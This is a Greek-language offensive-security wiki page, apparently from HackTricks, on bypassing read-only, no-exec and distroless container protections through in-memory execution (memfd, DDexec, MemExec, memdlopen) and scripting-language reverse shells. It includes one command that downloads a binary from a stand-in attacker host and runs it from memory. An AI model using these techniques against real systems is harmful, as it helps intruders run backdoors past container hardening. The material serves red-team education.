# Παράκαμψη προστασιών FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Videos

Στα παρακάτω videos μπορείτε να βρείτε τις τεχνικές που αναφέρονται σε αυτή τη σελίδα εξηγημένες με περισσότερες λεπτομέρειες:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Σενάριο read-only / no-exec

Είναι όλο και πιο συνηθισμένο να βρίσκουμε linux machines mounted με **read-only (ro) file system protection**, ειδικά σε containers. Αυτό συμβαίνει επειδή για να εκτελέσετε ένα container με ro file system αρκεί να ορίσετε το **`readOnlyRootFilesystem: true`** στο `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ωστόσο, ακόμη κι αν το file system είναι mounted ως ro, το **`/dev/shm`** θα παραμένει writable, επομένως είναι ψευδές ότι δεν μπορούμε να γράψουμε τίποτα στον δίσκο. Παρ' όλα αυτά, αυτός ο φάκελος θα είναι **mounted με no-exec protection**, οπότε αν κατεβάσετε ένα binary εδώ **δεν θα μπορείτε να το εκτελέσετε**.

> [!WARNING]
> Από την οπτική ενός red team, αυτό κάνει **περίπλοκη τη λήψη και εκτέλεση** binaries που δεν υπάρχουν ήδη στο σύστημα (όπως backdoors ή enumerators όπως το `kubectl`).

## Ο ευκολότερος τρόπος παράκαμψης: Scripts

Σημειώστε ότι ανέφερα binaries. Μπορείτε να **εκτελέσετε οποιοδήποτε script**, αρκεί ο interpreter να υπάρχει στο machine, όπως ένα **shell script** αν υπάρχει το `sh` ή ένα **python** **script** αν είναι εγκατεστημένο το `python`.

Ωστόσο, αυτό από μόνο του δεν αρκεί για να εκτελέσετε το binary backdoor σας ή άλλα binary tools που μπορεί να χρειάζεται να εκτελέσετε.

## Memory Bypasses

Αν θέλετε να εκτελέσετε ένα binary αλλά το file system δεν το επιτρέπει, ο καλύτερος τρόπος είναι να το **εκτελέσετε από τη memory**, καθώς οι **protections δεν εφαρμόζονται εκεί**.

### FD + exec syscall bypass

Αν έχετε διαθέσιμα στο machine ισχυρά script engines, όπως **Python**, **Perl** ή **Ruby**, μπορείτε να κατεβάσετε το binary που θέλετε να εκτελέσετε στη memory, να το αποθηκεύσετε σε έναν memory file descriptor (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις protections, και στη συνέχεια να καλέσετε ένα **`exec` syscall**, υποδεικνύοντας το **fd ως το file προς εκτέλεση**.

Για αυτό μπορείτε εύκολα να χρησιμοποιήσετε το project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Μπορείτε να του δώσετε ένα binary και θα δημιουργήσει ένα script στην υποδεικνυόμενη γλώσσα, με το **binary συμπιεσμένο και κωδικοποιημένο σε b64**, μαζί με τις εντολές για **αποκωδικοποίηση και αποσυμπίεσή του** σε ένα **fd** που δημιουργείται μέσω κλήσης του `create_memfd` syscall, καθώς και μια κλήση στο **exec** syscall για την εκτέλεσή του.

> [!WARNING]
> Αυτό δεν λειτουργεί σε άλλα scripting languages όπως η PHP ή το Node, επειδή δεν διαθέτουν **προεπιλεγμένο τρόπο κλήσης raw syscalls** από ένα script, επομένως δεν είναι δυνατή η κλήση του `create_memfd` για τη δημιουργία του **memory fd** όπου θα αποθηκευτεί το binary.
>
> Επιπλέον, η δημιουργία ενός **regular fd** με ένα file στο `/dev/shm` δεν θα λειτουργήσει, καθώς δεν θα επιτρέπεται η εκτέλεσή του επειδή θα εφαρμοστεί η **no-exec protection**.

### DDexec / EverythingExec

Το [**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σας επιτρέπει να **τροποποιήσετε τη memory της δικής σας process**, κάνοντας overwrite στο **`/proc/self/mem`**.

Επομένως, **ελέγχοντας τον assembly code** που εκτελείται από τη process, μπορείτε να γράψετε ένα **shellcode** και να «μεταλλάξετε» την process ώστε να **εκτελέσει οποιονδήποτε arbitrary code**.

> [!TIP]
> Το **DDexec / EverythingExec** σας επιτρέπει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε binary** από τη **memory**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε το Github ή:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

Το [**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode που εκτελείται ως daemon**, επομένως κάθε φορά που θέλετε να **εκτελέσετε ένα διαφορετικό binary** δεν χρειάζεται να επανεκκινήσετε το DDexec· μπορείτε απλώς να εκτελέσετε το memexec shellcode μέσω της τεχνικής DDexec και στη συνέχεια να **επικοινωνήσετε με αυτόν τον daemon για να του περάσετε νέα binaries προς φόρτωση και εκτέλεση**.

Μπορείτε να βρείτε ένα παράδειγμα χρήσης του **memexec για την εκτέλεση binaries από ένα PHP reverse shell** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης binaries** στη μνήμη, ώστε να εκτελεστούν αργότερα. Μπορεί να επιτρέψει ακόμη και τη φόρτωση binaries με dependencies.

## Παράκαμψη Distroless

Για μια εξειδικευμένη εξήγηση σχετικά με το **τι είναι στην πραγματικότητα το distroless**, πότε βοηθά, πότε όχι και πώς αλλάζει το post-exploitation tradecraft σε containers, δείτε:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Τι είναι το distroless

Τα distroless containers περιέχουν μόνο τα **απολύτως απαραίτητα components για την εκτέλεση μιας συγκεκριμένης εφαρμογής ή υπηρεσίας**, όπως libraries και runtime dependencies, αλλά εξαιρούν μεγαλύτερα components όπως package manager, shell ή system utilities.

Στόχος των distroless containers είναι η **μείωση του attack surface των containers με την εξάλειψη μη απαραίτητων components** και η ελαχιστοποίηση του αριθμού των vulnerabilities που μπορούν να γίνουν exploit.

### Reverse Shell

Σε ένα distroless container μπορεί να **μη βρείτε καν `sh` ή `bash`** για να αποκτήσετε ένα κανονικό shell. Επίσης δεν θα βρείτε binaries όπως `ls`, `whoami`, `id`... δηλαδή οτιδήποτε εκτελείτε συνήθως σε ένα system.

> [!WARNING]
> Επομένως, **δεν** θα μπορείτε να αποκτήσετε ένα **reverse shell** ή να κάνετε **enumerate** το system όπως συνήθως.

Ωστόσο, αν το compromised container εκτελεί, για παράδειγμα, ένα Flask web application, τότε είναι εγκατεστημένο το Python και επομένως μπορείτε να αποκτήσετε ένα **Python reverse shell**. Αν εκτελεί Node, μπορείτε να αποκτήσετε ένα Node rev shell, και το ίδιο ισχύει σχεδόν για οποιαδήποτε **scripting language**.

> [!TIP]
> Χρησιμοποιώντας τη scripting language, θα μπορούσατε να κάνετε **enumerate το system** μέσω των δυνατοτήτων της γλώσσας.

Αν δεν υπάρχουν **`read-only/no-exec`** protections, θα μπορούσατε να εκμεταλλευτείτε το reverse shell σας για να **γράψετε τα binaries σας στο file system** και να τα **εκτελέσετε**.

> [!TIP]
> Ωστόσο, σε αυτού του είδους τα containers αυτές οι protections συνήθως υπάρχουν, αλλά θα μπορούσατε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές memory execution για να τις παρακάμψετε**.

Μπορείτε να βρείτε **παραδείγματα** σχετικά με το πώς να **εκμεταλλευτείτε ορισμένα RCE vulnerabilities** για να αποκτήσετε **reverse shells σε scripting languages** και να εκτελέσετε binaries από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
